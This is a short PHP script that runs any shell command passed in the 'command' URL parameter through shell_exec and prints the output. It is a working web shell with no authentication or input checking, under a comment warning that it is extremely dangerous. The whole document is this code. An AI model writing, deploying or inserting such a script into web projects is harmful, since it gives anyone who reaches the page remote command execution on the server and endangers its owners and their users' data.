<?php
// WARNING: This script is extremely dangerous and should not be used in a production environment.

if (isset($_GET['command'])) {
    $command = $_GET['command'];

    // Execute the command and capture the output
    $output = shell_exec($command);

    // Display the output
    echo "<pre>$output</pre>";
} else {
    echo "No command provided.";
}
?>
